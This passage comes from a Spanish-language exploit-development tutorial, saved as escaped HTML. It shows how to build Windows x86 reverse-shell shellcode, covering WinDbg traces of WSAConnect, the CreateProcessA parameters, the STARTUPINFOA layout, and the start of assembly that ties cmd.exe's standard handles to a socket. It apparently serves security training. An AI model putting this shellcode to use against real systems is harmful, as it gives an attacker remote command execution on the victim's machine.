&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000010 ebx=76760000 ecx=6a17ad58 edx=00000014 esi=00000204 edi=02cdf294
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=0164011f esp=02cdf278 ebp=02cdf8d8 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0164011f ff5528          call    dword ptr [ebp+28h]  ss:0023:02cdf900={WS2_32!WSAConnect (76796c80)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;em&gt;Recordad que para que podamos llamar tanto a &lt;code&gt;WSASocketA&lt;&#x2F;code&gt; y &lt;code&gt;WSAConnect&lt;&#x2F;code&gt;, debemos resolver primeros los símbolos y añadirlos en la función &lt;code&gt;resolve_symbols_ws2_32&lt;&#x2F;code&gt;.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;llamada-a-createprocessa&quot;&gt;LLamada a CreateProcessA&lt;a class=&quot;zola-anchor&quot; href=&quot;#llamada-a-createprocessa&quot; aria-label=&quot;Anchor link for: llamada-a-createprocessa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Ahora que hemos iniciado con éxito una conexión, necesitamos encontrar una forma de iniciar un cmd.exe procesar y redirigir su entrada y salida a través de nuestra conexión iniciada.&lt;&#x2F;p&gt;
&lt;p&gt;Usaremos la API &lt;code&gt;CreateProcess&lt;&#x2F;code&gt; para, como su nombre indica, crear un nuevo proceso.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BOOL&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;CreateProcessA&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPCSTR&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpApplicationName&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPSTR&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCommandLine&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPSECURITY_ATTRIBUTES &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpProcessAttributes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPSECURITY_ATTRIBUTES &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpThreadAttributes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BOOL&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;bInheritHandles&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;dwCreationFlags&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPVOID&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpEnvironment&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPCSTR&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCurrentDirectory&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPSTARTUPINFOA &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpStartupInfo&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPPROCESS_INFORMATION lpProcessInformation
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El primer parámetro requerido por la API es &lt;code&gt;lpApplicationName&lt;&#x2F;code&gt;. Este parámetro debe contener un puntero a una cadena que representa la aplicación que se ejecutará.&lt;&#x2F;p&gt;
&lt;p&gt;Si el parámetro se establece en nulo, el segundo parámetro (&lt;code&gt;lpCommandLine&lt;&#x2F;code&gt;) no puede ser nulo, y viceversa. Este parámetro espera un puntero a una cadena que contiene la línea de comandos que se ejecutará.&lt;&#x2F;p&gt;
&lt;p&gt;Nuestro shellcode utilizará este parámetro para ejecutar cmd.exe.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, abordaremos los parámetros &lt;code&gt;lpProcessAttributes&lt;&#x2F;code&gt; y &lt;code&gt;lpThreadAttributes&lt;&#x2F;code&gt; , que requieren punteros a estructuras de tipo &lt;strong&gt;SECURITY_ATTRIBUTES&lt;&#x2F;strong&gt; . Para nuestro shellcode, estos parámetros pueden establecerse en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;El siguiente parámetro, bInheritHandles, espera un valor TRUE (1) o FALSE (0). Este valor determina si los handles heredables del proceso de llamada de Python son heredados por el nuevo proceso (cmd.exe). Necesitaremos establecer este valor en TRUE para nuestra shell inversa.&lt;&#x2F;p&gt;
&lt;p&gt;A &lt;code&gt;bInheritHandles&lt;&#x2F;code&gt; le sigue el parámetro &lt;code&gt;dwCreationFlags&lt;&#x2F;code&gt;, que acepta varios flags de creación de procesos. Si este valor se establece en nulo, el proceso &lt;code&gt;cmd.exe&lt;&#x2F;code&gt; utilizará los mismos flags de creación que el proceso que lo invocó.&lt;&#x2F;p&gt;
&lt;p&gt;El parámetro &lt;code&gt;lpEnvironment&lt;&#x2F;code&gt; espera un puntero a un bloque de entorno. Según la documentación oficial, si este parámetro se establece en nulo, el nuevo proceso compartirá el mismo bloque de entorno que el proceso que realiza la llamada.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;lpCurrentDirectory&lt;&#x2F;code&gt; nos permite especificar la ruta completa al directorio desde el cual se iniciará el nuevo proceso. Si se establece en nulo, el proceso utilizará el mismo directorio que el proceso actual.&lt;&#x2F;p&gt;
&lt;p&gt;En el caso de &lt;code&gt;cmd.exe&lt;&#x2F;code&gt;, como está incluido en el &lt;code&gt;PATH&lt;&#x2F;code&gt;, puede ejecutarse desde cualquier ubicación. Sin embargo, dependiendo del proceso que ejecute el shellcode, este parámetro podría ser necesario.&lt;&#x2F;p&gt;
&lt;p&gt;Dado que la estructura &lt;code&gt;PROCESS_INFORMATION&lt;&#x2F;code&gt; se rellenará como parte de la API, solo necesitamos conocer su tamaño. Por otro lado, la estructura &lt;code&gt;STARTUPINFOA&lt;&#x2F;code&gt; debe pasarse a la API mediante nuestro shellcode.&lt;&#x2F;p&gt;
&lt;p&gt;La estructura es la siguiente:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c++&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c++&quot;&gt;struct&lt;&#x2F;span&gt; _STARTUPINFOA &lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c++&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  cb&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPSTR&lt;&#x2F;span&gt;  lpReserved&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPSTR&lt;&#x2F;span&gt;  lpDesktop&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPSTR&lt;&#x2F;span&gt;  lpTitle&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwX&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwY&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwXSize&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwYSize&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwXCountChars&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwYCountChars&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwFillAttribute&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt;  dwFlags&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;   wShowWindow&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt;   cbReserved2&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;LPBYTE&lt;&#x2F;span&gt; lpReserved2&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;HANDLE&lt;&#x2F;span&gt; hStdInput&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;HANDLE&lt;&#x2F;span&gt; hStdOutput&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;HANDLE&lt;&#x2F;span&gt; hStdError&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c++&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-type z-typedef z-c++&quot;&gt;STARTUPINFOA&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;LPSTARTUPINFOA&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La mayoria de los miembros de la estructura podemos establecerlos en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;EL primero miembro que debemos definir es &lt;code&gt;cb&lt;&#x2F;code&gt;, que requiere el tamaño de la esctructura, podemos calcular el tamaño volcándola:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dt STARTUPINFOA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ole32!STARTUPINFOA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 cb               : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 lpReserved       : Ptr32 Char
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 lpDesktop        : Ptr32 Char
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c lpTitle          : Ptr32 Char
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 dwX              : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 dwY              : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 dwXSize          : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c dwYSize          : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 dwXCountChars    : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 dwYCountChars    : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 dwFillAttribute  : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c dwFlags          : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x030 wShowWindow      : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x032 cbReserved2      : Uint2B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x034 lpReserved2      : Ptr32 UChar
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x038 hStdInput        : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c hStdOutput       : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x040 hStdError        : Ptr32 Void
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ?? sizeof(STARTUPINFOA)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;unsigned int 0x44
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El segundo miembro que debemos considerar es &lt;code&gt;dwFlags&lt;&#x2F;code&gt;. Determina si se utilizan ciertos miembros de la estructura &lt;code&gt;STARTUPINFOA&lt;&#x2F;code&gt; al crear una ventana. Necesitaremos configurar este miembro con el indicador &lt;code&gt;STARTF_USESTDHANDLES&lt;&#x2F;code&gt; para habilitar los miembros &lt;strong&gt;hStdInput, hStdOutput y hStdError&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Vale la pena mencionar que si se especifica este indicador, los controladores del proceso de llamada deben ser heredables y el parámetro bInheritHandles debe establecerse en VERDADERO.&lt;&#x2F;p&gt;
&lt;p&gt;Dado que estableceremos la bandera &lt;strong&gt;STARTF_USESTDHANDLES&lt;&#x2F;strong&gt; , también debemos establecer los miembros que esta bandera habilita. La documentación oficial indica que todos estos miembros aceptan un identificador, que recibe entrada (&lt;strong&gt;hStdInput&lt;&#x2F;strong&gt;), salida (&lt;strong&gt;hStdOutput&lt;&#x2F;strong&gt;) y gestión de errores (&lt;strong&gt;hStdError&lt;&#x2F;strong&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Para interactuar con el proceso cmd.exe a través de nuestro socket, podemos especificar el descriptor de socket obtenido de la llamada a la API WSASocketA como identificador.&lt;&#x2F;p&gt;
&lt;p&gt;Dividiremos el shellcode en varias funciones:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;create_startupinfoa:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta hStdError
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta hStdOutput
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta hStdInput
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor     eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment 